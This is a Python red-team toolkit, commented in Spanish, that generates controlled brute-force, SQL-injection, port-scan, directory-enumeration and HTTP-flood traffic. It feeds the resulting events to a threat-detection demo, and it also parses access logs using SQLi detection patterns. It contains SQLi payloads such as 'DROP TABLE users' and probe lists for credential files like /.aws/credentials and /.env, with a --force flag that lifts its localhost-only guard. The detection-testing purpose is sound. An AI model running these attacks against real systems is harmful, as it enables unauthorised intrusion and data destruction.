#!/usr/bin/env python3
# ==============================================================================
# attack_toolkit.py — Red Team toolkit para VicoGuard AI (Cristhian Taipe)
# ------------------------------------------------------------------------------
# Genera ataques CONTROLADOS contra un objetivo propio y reenvía la telemetría
# al endpoint /api/v1/telemetry/ingest de VicoGuard para que la IA correlacione
# y dispare la alerta de Telegram (el "beat" de la demo).
#
# Modos:
#   bruteforce  → ráfaga de logins fallidos           → eventos BRUTE_FORCE
#   sqli        → payloads SQLi clásicos a un parámetro→ eventos SQLI_ATTEMPT
#   portscan    → conexión a puertos comunes           → eventos PORT_SCAN
#   dirfuzz     → pide rutas sensibles (/.env, /admin) → eventos DIR_ENUM
#   flood       → ráfaga de peticiones (DoS suave)     → eventos HTTP_FLOOD
#   synthetic   → NO toca ningún host: fabrica una ráfaga de ataque realista
#                 y la envía a VicoGuard (Plan B para la demo sin red)
#
# Ejemplos:
#   python attack_toolkit.py synthetic --forward http://localhost:8000
#   python attack_toolkit.py bruteforce --target http://127.0.0.1:8080/login -n 25 --forward http://localhost:8000
#   python attack_toolkit.py sqli --target "http://127.0.0.1:8080/vulnerabilities/sqli/?id=1" --forward http://localhost:8000
#   python attack_toolkit.py portscan --target 127.0.0.1 --dry-run
#
# ÉTICA (misma disciplina que tus VDPs): por defecto SOLO se permiten objetivos
# en localhost / rangos privados. Para cualquier otro host hay que pasar --force
# y asumir que tienes permiso. sqlmap/hydra "de verdad" apúntalos igual: tu DVWA.
# ==============================================================================
import argparse
import ipaddress
import json
import random
import re
import socket
import sys
import time
from datetime import datetime, timezone
from urllib.parse import urlparse

# ---- Config ----
DEFAULT_API_KEY = "vg_demo"
TELEMETRY_PATH = "/api/v1/telemetry/ingest"

# IPs de "atacante" simuladas para dar variedad a la telemetría
FAKE_ATTACKER_IPS = [
    "185.220.101.45", "45.155.205.233", "193.32.162.11",
    "5.188.206.18", "89.248.165.74", "141.98.10.63",
]

# Payloads SQLi clásicos (para disparar WAF/500/403 en el objetivo)
SQLI_PAYLOADS = [
    "1' OR '1'='1", "1' OR '1'='1' -- ", "' UNION SELECT NULL-- ",
    "1; DROP TABLE users-- ", "' OR SLEEP(3)-- ", "admin'--",
]

# Rutas sensibles para enumeración
SENSITIVE_PATHS = [
    "/.env", "/.git/config", "/admin", "/wp-admin", "/phpmyadmin",
    "/api/debug", "/backup.zip", "/config.php.bak", "/.aws/credentials",
]

# Puertos comunes para el "port scan"
COMMON_PORTS = [21, 22, 23, 25, 80, 110, 143, 443, 445, 3306, 3389, 5432, 6379, 8080, 8443]


# ============================================================
# Utilidades
# ============================================================
def now_iso() -> str:
    return datetime.now(timezone.utc).isoformat()


def make_event(etype: str, source_ip: str, status_code: int, path: str, **extra) -> dict:
    """Construye un evento con el shape que espera /api/v1/telemetry/ingest."""
    ev = {
        "timestamp": now_iso(),
        "type": etype,
        "source_ip": source_ip,
        "status_code": status_code,
        "path": path,
    }
    ev.update(extra)
    return ev


def is_private_or_local(target: str) -> bool:
    """True si el host es localhost o IP privada (permitido sin --force)."""
    host = target
    if "://" in target:
        host = urlparse(target).hostname or ""
    else:
        host = target.split(":")[0].split("/")[0]
    if host in ("localhost", "127.0.0.1", "::1", ""):
        return True
    try:
        ip = ipaddress.ip_address(socket.gethostbyname(host))
        return ip.is_private or ip.is_loopback
    except (ValueError, socket.gaierror):
        return False


def guard_target(target: str, force: bool):
    """Bloquea objetivos externos salvo --force (disciplina de scope)."""
    if is_private_or_local(target):
        return
    if not force:
        print("\n  ⛔ SEGURIDAD: el objetivo NO es localhost/privado.")
        print(f"     Objetivo: {target}")
        print("     Este toolkit es SOLO para tu señuelo/localhost o con permiso explícito.")
        print("     Si de verdad tienes autorización, repite con --force.\n")
        sys.exit(2)
    print(f"  ⚠️  --force activo: atacando objetivo externo {target}. Asumo que tienes permiso.\n")


def forward_events(vicoguard_url: str, events: list, api_key: str = DEFAULT_API_KEY) -> None:
    """Envía los eventos a VicoGuard (import perezoso de requests)."""
    if not events:
        return
    try:
        import requests
    except ImportError:
        print("  [!] 'requests' no instalado; no puedo reenviar. (pip install requests)")
        return
    url = vicoguard_url.rstrip("/") + TELEMETRY_PATH
    try:
        r = requests.post(url, json={"api_key": api_key, "events": events}, timeout=15)
        print(f"  📡 Telemetría → {url}  [{r.status_code}]")
        try:
            body = r.json()
            corr = body.get("correlation", {})
            print(f"     status={corr.get('overall_status','?')} "
                  f"real_threats={len(corr.get('real_threats', []))} "
                  f"eventos={body.get('processed_events','?')}")
        except Exception:
            pass
    except Exception as e:  # noqa: BLE001
        print(f"  [!] Error reenviando a VicoGuard: {e}")


def emit(events: list, args) -> None:
    """Imprime / reenvía los eventos según flags."""
    print(f"\n  ✅ Generados {len(events)} eventos.")
    if args.dry_run or not args.forward:
        print(json.dumps(events[:6], indent=2, ensure_ascii=False))
        if len(events) > 6:
            print(f"     ... (+{len(events)-6} más)")
    if args.forward and not args.dry_run:
        forward_events(args.forward, events, args.api_key)


# ============================================================
# Modos de ataque
# ============================================================
def mode_bruteforce(args) -> list:
    """Ráfaga de logins fallidos → BRUTE_FORCE."""
    guard_target(args.target, args.force)
    events, ip = [], random.choice(FAKE_ATTACKER_IPS)
    users = ["admin", "root", "administrator", "test", "user"]
    passwords = ["123456", "password", "admin", "letmein", "qwerty", "root"]
    session = _http_session(args)
    path = urlparse(args.target).path or "/login"
    for i in range(args.count):
        u, p = random.choice(users), random.choice(passwords)
        code = 401
        if session and not args.dry_run:
            code = _try_login(session, args.target, u, p)
        events.append(make_event("BRUTE_FORCE", ip, code, path, user=u))
        _tick(args, i)
    return events


def mode_sqli(args) -> list:
    """Inyecta payloads SQLi a un parámetro → SQLI_ATTEMPT."""
    guard_target(args.target, args.force)
    events, ip = [], random.choice(FAKE_ATTACKER_IPS)
    session = _http_session(args)
    path = urlparse(args.target).path or "/"
    for i, payload in enumerate(SQLI_PAYLOADS * args.rounds):
        code = 500
        if session and not args.dry_run:
            code = _send_payload(session, args.target, payload)
        events.append(make_event("SQLI_ATTEMPT", ip, code, path, payload=payload))
        _tick(args, i)
    return events


def mode_portscan(args) -> list:
    """Conexión TCP a puertos comunes → PORT_SCAN."""
    guard_target(args.target, args.force)
    host = urlparse(args.target).hostname or args.target.split(":")[0]
    ip = random.choice(FAKE_ATTACKER_IPS)
    events = []
    for port in COMMON_PORTS:
        open_ = False
        if not args.dry_run:
            open_ = _port_open(host, port)
        events.append(make_event("PORT_SCAN", ip, 0, f"tcp://{host}:{port}",
                                  port=port, state="open" if open_ else "closed"))
        _tick(args, port)
    return events


def mode_dirfuzz(args) -> list:
    """Pide rutas sensibles → DIR_ENUM (ráfaga de 404/403/200)."""
    guard_target(args.target, args.force)
    events, ip = [], random.choice(FAKE_ATTACKER_IPS)
    session = _http_session(args)
    base = args.target.rstrip("/")
    for i, path in enumerate(SENSITIVE_PATHS):
        code = 404
        if session and not args.dry_run:
            code = _get_status(session, base + path)
        events.append(make_event("DIR_ENUM", ip, code, path))
        _tick(args, i)
    return events


def mode_flood(args) -> list:
    """Ráfaga de peticiones (DoS suave, controlado) → HTTP_FLOOD."""
    guard_target(args.target, args.force)
    events, ip = [], random.choice(FAKE_ATTACKER_IPS)
    session = _http_session(args)
    path = urlparse(args.target).path or "/"
    for i in range(args.count):
        code = 200
        if session and not args.dry_run:
            code = _get_status(session, args.target)
        events.append(make_event("HTTP_FLOOD", ip, code, path))
        _tick(args, i)
    return events


# --- Parser de access logs (Apache/Nginx common+combined) ---
APACHE_LOG_RE = re.compile(
    r'(?P<ip>\S+) \S+ \S+ \[(?P<ts>[^\]]+)\] '
    r'"(?P<method>[A-Z]+) (?P<path>\S+)[^"]*" (?P<status>\d{3})'
)


def _classify_line(method: str, path: str, status: int, ip: str, counters: dict) -> str:
    """Clasifica una línea de log en un tipo de amenaza (heurística)."""
    # Decodifica URL-encoding (+ → espacio, %27 → ') antes de buscar patrones
    from urllib.parse import unquote_plus
    low = unquote_plus(path).lower()
    sqli_markers = ("union", "select", "sleep(", "' or", "or '", "'='", "or 1=1",
                    "--", "0x", "concat(", "information_schema", "' and")
    if any(m in low for m in sqli_markers):
        return "SQLI_ATTEMPT"
    if any(path.startswith(p) or path == p for p in SENSITIVE_PATHS):
        return "DIR_ENUM"
    if status in (401, 403) and ("login" in low or "admin" in low or method == "POST"):
        counters["auth_fail"][ip] = counters["auth_fail"].get(ip, 0) + 1
        return "BRUTE_FORCE"
    counters["req"][ip] = counters["req"].get(ip, 0) + 1
    if counters["req"][ip] > counters["flood_threshold"]:
        return "HTTP_FLOOD"
    return "HTTP_REQUEST"


def parse_log_line(line: str, counters: dict):
    """Convierte una línea de access log en un evento de telemetría, o None."""
    m = APACHE_LOG_RE.search(line)
    if not m:
        return None
    d = m.groupdict()
    status = int(d["status"])
    etype = _classify_line(d["method"], d["path"], status, d["ip"], counters)
    return make_event(etype, d["ip"], status, d["path"], method=d["method"])


def mode_tail(args) -> list:
    """Lee access logs REALES (Apache/Nginx) y reenvía la telemetría en streaming."""
    if not args.logfile:
        print("  [!] Falta --logfile con la ruta del access log")
        print("      ej: --logfile /var/log/apache2/access.log")
        sys.exit(2)

    counters = {"req": {}, "auth_fail": {}, "flood_threshold": args.flood_threshold}
    batch: list = []
    last_flush = time.time()

    def flush():
        nonlocal last_flush
        if not batch:
            return
        if args.forward and not args.dry_run:
            forward_events(args.forward, list(batch), args.api_key)
        else:
            resumen = ", ".join(f"{e['type']}:{e['status_code']}" for e in batch[:8])
            print(f"  [lote {len(batch)}] {resumen}")
        batch.clear()
        last_flush = time.time()

    modo = "una pasada" if args.no_follow else "streaming (follow)"
    print(f"  📖 Leyendo {args.logfile}  [{modo}]  — Ctrl-C para parar\n")
    try:
        with open(args.logfile, "r", encoding="utf-8", errors="replace") as fh:
            if args.no_follow:
                for line in fh:
                    ev = parse_log_line(line, counters)
                    if ev:
                        batch.append(ev)
                    if len(batch) >= args.batch:
                        flush()
            else:
                fh.seek(0, 2)  # ir al final: solo líneas nuevas
                while True:
                    line = fh.readline()
                    if not line:
                        if batch and time.time() - last_flush >= args.flush_interval:
                            flush()
                        time.sleep(0.3)
                        continue
                    ev = parse_log_line(line, counters)
                    if ev:
                        batch.append(ev)
                    if len(batch) >= args.batch:
                        flush()
    except FileNotFoundError:
        print(f"  [!] No existe el log: {args.logfile}")
        sys.exit(2)
    except KeyboardInterrupt:
        print("\n  ⏹  Detenido.")
    finally:
        flush()
    return []  # tail gestiona su propio reenvío


def mode_synthetic(args) -> list:
    """PLAN B: fabrica una ráfaga de ataque REALISTA sin tocar ningún host."""
    events = []
    ip_bf = random.choice(FAKE_ATTACKER_IPS)
    # 1) Fuerza bruta
    for _ in range(args.count):
        events.append(make_event("BRUTE_FORCE", ip_bf, 401, "/login",
                                  user=random.choice(["admin", "root", "test"])))
    # 2) Escaneo de puertos
    ip_ps = random.choice(FAKE_ATTACKER_IPS)
    for port in random.sample(COMMON_PORTS, 8):
        events.append(make_event("PORT_SCAN", ip_ps, 0, f"tcp://target:{port}", port=port))
    # 3) SQLi
    ip_sqli = random.choice(FAKE_ATTACKER_IPS)
    for payload in SQLI_PAYLOADS:
        events.append(make_event("SQLI_ATTEMPT", ip_sqli, 500,
                                  "/products?id=1", payload=payload))
    # 4) Ruido inofensivo (para que la IA demuestre que filtra lo real del ruido)
    for _ in range(args.count):
        events.append(make_event("HTTP_REQUEST", "8.8.8.8", 200,
                                  random.choice(["/", "/about", "/favicon.ico", "/css/main.css"])))
    random.shuffle(events)
    return events


# ============================================================
# Helpers HTTP / red (import perezoso de requests)
# ============================================================
def _http_session(args):
    if args.dry_run:
        return None
    try:
        import requests
        s = requests.Session()
        s.headers.update({"User-Agent": "VicoGuard-RedTeam-Drill/1.0"})
        return s
    except ImportError:
        print("  [!] 'requests' no instalado → corriendo en modo simulado (como --dry-run).")
        return None


def _try_login(session, url, user, pwd):
    try:
        r = session.post(url, data={"username": user, "password": pwd},
                         timeout=8, allow_redirects=False)
        return r.status_code
    except Exception:
        return 0


def _send_payload(session, url, payload):
    try:
        r = session.get(url, params={"inject": payload}, timeout=8)
        return r.status_code
    except Exception:
        return 0


def _get_status(session, url):
    try:
        return session.get(url, timeout=8, allow_redirects=False).status_code
    except Exception:
        return 0


def _port_open(host, port, timeout=0.5):
    try:
        with socket.create_connection((host, port), timeout=timeout):
            return True
    except (socket.timeout, ConnectionRefusedError, OSError):
        return False


def _tick(args, i):
    """Pequeña pausa para no saturar (ataque 'controlado')."""
    if not args.dry_run and args.delay > 0:
        time.sleep(args.delay)


# ============================================================
# CLI
# ============================================================
MODES = {
    "bruteforce": mode_bruteforce,
    "sqli": mode_sqli,
    "portscan": mode_portscan,
    "dirfuzz": mode_dirfuzz,
    "flood": mode_flood,
    "synthetic": mode_synthetic,
    "tail": mode_tail,
}


def build_parser():
    p = argparse.ArgumentParser(
        description="Red Team toolkit para VicoGuard AI — ataques controlados + telemetría.",
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    p.add_argument("mode", choices=MODES.keys(), help="Modo de ataque a ejecutar")
    p.add_argument("-t", "--target", default="http://127.0.0.1:8080",
                   help="Objetivo (URL o host). Solo localhost/privado sin --force.")
    p.add_argument("-f", "--forward", metavar="VICOGUARD_URL",
                   help="URL base de VicoGuard para reenviar telemetría (ej: http://localhost:8000)")
    p.add_argument("-n", "--count", type=int, default=20, help="Nº de intentos/eventos (default 20)")
    p.add_argument("-r", "--rounds", type=int, default=2, help="Rondas de payloads en modo sqli")
    p.add_argument("-d", "--delay", type=float, default=0.1, help="Pausa entre peticiones (s)")
    p.add_argument("--api-key", default=DEFAULT_API_KEY, help="API key de telemetría (default vg_demo)")
    p.add_argument("--force", action="store_true", help="Permitir objetivo NO local (asumes permiso)")
    p.add_argument("--dry-run", action="store_true",
                   help="No toca la red: solo genera/imprime los eventos")
    # --- modo tail (logs reales) ---
    p.add_argument("--logfile", help="[tail] ruta del access log (Apache/Nginx)")
    p.add_argument("--no-follow", action="store_true",
                   help="[tail] leer el log una vez y salir (no seguir en streaming)")
    p.add_argument("--batch", type=int, default=10, help="[tail] eventos por lote antes de reenviar")
    p.add_argument("--flush-interval", type=float, default=3.0,
                   help="[tail] segundos máximos antes de reenviar un lote parcial")
    p.add_argument("--flood-threshold", type=int, default=50,
                   help="[tail] peticiones por IP para marcar HTTP_FLOOD")
    return p


def main():
    args = build_parser().parse_args()
    print("=" * 62)
    print(f"🛡️  VicoGuard Red Team — modo: {args.mode}")
    if args.mode not in ("synthetic", "tail"):
        print(f"    objetivo: {args.target}   dry-run: {args.dry_run}")
    print("=" * 62)

    if args.mode == "tail":
        MODES[args.mode](args)          # gestiona su propio streaming/reenvío
    else:
        emit(MODES[args.mode](args), args)

    print("\n  Recuerda: reset del señuelo + limpieza de logs antes del pitch (Fase 4).")
    print("=" * 62)


if __name__ == "__main__":
    main()
